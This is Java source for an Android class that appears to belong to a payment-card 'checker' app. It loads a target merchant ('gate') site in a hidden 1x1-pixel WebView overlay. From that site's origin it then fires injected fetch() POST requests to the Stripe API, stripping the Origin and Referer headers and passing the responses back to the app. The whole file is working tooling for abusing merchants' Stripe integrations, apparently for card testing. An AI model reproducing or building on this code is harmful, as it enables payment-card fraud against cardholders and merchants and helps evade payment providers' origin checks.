package com.h0checker.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Loads the gate's site in a 1x1 pixel WebView overlay, then executes
 * raw fetch() to Stripe API from the site's origin.
 *
 * KEY: WebView must be VISIBLE (even 1px) for JS to execute on all devices.
 * GONE/invisible WebViews get JS throttled or killed by Android battery saver.
 */
public class StripeWebBridge {

    private static final String TAG = "StripeBridge";
    private static StripeWebBridge instance;
    private Activity activity;
    private WebView webView;
    private String loadedSiteUrl = null;

    private CountDownLatch curLatch;
    private String[] curResult;

    @SuppressLint("SetJavaScriptEnabled")
    public static void init(Activity act) {
        if (instance != null) return;
        instance = new StripeWebBridge();
        instance.activity = act;
        act.runOnUiThread(() -> instance.createWebView(act));
    }

    public static StripeWebBridge getInstance() { return instance; }

    @SuppressLint("SetJavaScriptEnabled")
    private void createWebView(Activity act) {
        webView = new WebView(act);

        // 1x1 pixel overlay — MUST be visible for JS to execute
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            1, 1,
            WindowManager.LayoutParams.TYPE_APPLICATION_PANEL,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        webView.addJavascriptInterface(new BridgeJS(), "SB");
        webView.setBackgroundColor(Color.TRANSPARENT);

        // Attach as overlay — visible but 1px, so JS runs
        try {
            act.addContentView(webView, params);
        } catch (Exception e) {
            // Fallback: add to root view
            ViewGroup root = (ViewGroup) act.getWindow().getDecorView()
                    .findViewById(android.R.id.content);
            root.addView(webView, new ViewGroup.LayoutParams(1, 1));
        }

        Log.i(TAG, "WebView created (1px overlay, JS enabled)");
    }

    /**
     * Execute a POST to Stripe API via fetch() from the site's WebView context.
     */
    public synchronized String post(String siteUrl, String apiUrl,
                                     Map<String, String> headers, String body) {
        if (activity == null || webView == null) {
            return "{\"error\":{\"message\":\"Bridge not initialized\"}}";
        }

        String cleanSite = siteUrl.replaceAll("/+$", "");

        // Step 1: Load site if needed
        if (!cleanSite.equals(loadedSiteUrl)) {
            Log.i(TAG, "Loading site: " + cleanSite);
            loadedSiteUrl = cleanSite;

            final CountDownLatch loadLatch = new CountDownLatch(1);
            activity.runOnUiThread(() -> {
                webView.setWebViewClient(new WebViewClient() {
                    @Override
                    public void onPageFinished(WebView view, String url) {
                        Log.i(TAG, "Loaded: " + url);
                        loadLatch.countDown();
                    }
                    @Override
                    public void onReceivedError(WebView view, int code, String desc, String url) {
                        Log.e(TAG, "Load error " + code + ": " + desc);
                        loadLatch.countDown();
                    }
                });
                webView.loadUrl(cleanSite);
            });

            try {
                if (!loadLatch.await(20, TimeUnit.SECONDS)) {
                    Log.w(TAG, "Site load timeout");
                }
            } catch (InterruptedException e) {
                return "{\"error\":{\"message\":\"Interrupted\"}}";
            }

            // Wait for page JS to settle
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}

            // Debug: check if fetch is available
            final String[] checkResult = {null};
            final CountDownLatch checkLatch = new CountDownLatch(1);
            activity.runOnUiThread(() -> {
                webView.evaluateJavascript(
                    "(function(){try{return typeof fetch}catch(e){return 'error:'+e.message}}})()",
                    v -> { checkResult[0] = v; checkLatch.countDown(); }
                );
            });
            try { checkLatch.await(5, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
            Log.i(TAG, "fetch type: " + checkResult[0]);
        }

        // Step 2: Build and execute fetch()
        StringBuilder headersJs = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, String> e : headers.entrySet()) {
            String k = e.getKey();
            if (k.equalsIgnoreCase("Origin") || k.equalsIgnoreCase("Referer")) continue;
            if (!first) headersJs.append(",");
            headersJs.append(jsStr(k)).append(":").append(jsStr(e.getValue()));
            first = false;
        }
        headersJs.append("}");

        String js = "(function(){" +
            "try{" +
            "  var p=fetch(" + jsStr(apiUrl) + ",{" +
            "    method:'POST'," +
            "    headers:" + headersJs + "," +
            "    body:" + jsStr(body) + "," +
            "    mode:'cors'," +
            "    credentials:'omit'" +
            "  });" +
            "  p.then(function(r){" +
            "    return r.text().then(function(t){" +
            "      SB.onResult(r.status,t);" +
            "    });" +
            "  })[" + "catch](function(e){" +
            "    SB.onError('catch:'+e.message);" +
            "  });" +
            "  p[" + "catch](function(e){" +
            "    SB.onError('promise:'+e.message);" +
            "  });" +
            "}catch(e){SB.onError('throw:'+e.message);}" +
            "})()";

        curLatch = new CountDownLatch(1);
        curResult = new String[]{null};

        final String fjs = js;
        Log.i(TAG, "Executing fetch to: " + apiUrl);
        activity.runOnUiThread(() -> {
            try {
                webView.evaluateJavascript(fjs, v -> Log.d(TAG, "eval=" + v));
            } catch (Exception e) {
                Log.e(TAG, "eval failed: " + e.getMessage());
                curResult[0] = "{\"error\":{\"message\":\"eval: " + e.getMessage() + "\"}}";
                curLatch.countDown();
            }
        });

        try {
            curLatch.await(30, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            return "{\"error\":{\"message\":\"Interrupted\"}}";
        }

        String result = curResult[0];
        curLatch = null;
        curResult = null;

        if (result != null) {
            Log.i(TAG, "Result: " + result.substring(0, Math.min(result.length(), 200)));
            return result;
        }
        Log.e(TAG, "No response from bridge (30s timeout)");
        return "{\"error\":{\"message\":\"No response from bridge\"}}";
    }

    private static String jsStr(String s) {
        if (s == null) return "''";
        return "'" + s.replace("\\", "\\\\").replace("'", "\\'")
                      .replace("\n", "\\n").replace("\r", "\\r")
                      .replace("/", "\\/") + "'";
    }

    private class BridgeJS {
        @JavascriptInterface
        public void onResult(int status, String body) {
            Log.i(TAG, "OK status=" + status + " len=" + (body != null ? body.length() : 0));
            if (curResult != null) curResult[0] = body;
            if (curLatch != null) curLatch.countDown();
        }

        @JavascriptInterface
        public void onError(String msg) {
            Log.e(TAG, "JS error: " + msg);
            if (curResult != null) curResult[0] = "{\"error\":{\"message\":\"" + msg.replace("\"", "'") + "\"}}";
            if (curLatch != null) curLatch.countDown();
        }
    }

    public void destroy() {
        if (webView != null) {
            webView.post(() -> {
                webView.loadUrl("about:blank");
                webView.destroy();
            });
        }
        instance = null;
    }
}
